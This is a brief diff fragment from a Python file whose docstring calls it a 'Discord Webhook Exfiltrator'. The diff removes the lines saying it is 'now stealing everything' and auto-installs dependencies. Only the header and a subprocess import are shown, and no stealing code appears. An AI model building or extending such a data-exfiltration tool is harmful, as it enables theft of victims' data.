@@ -1,8 +1,6 @@
 # -*- coding: utf-8 -*-
 """
 ULTRA HARVEST - Expanded Discord Webhook Exfiltrator
-Based on your working transfer script, now stealing everything.
-Auto-installs dependencies.
 """
 
 import subprocess
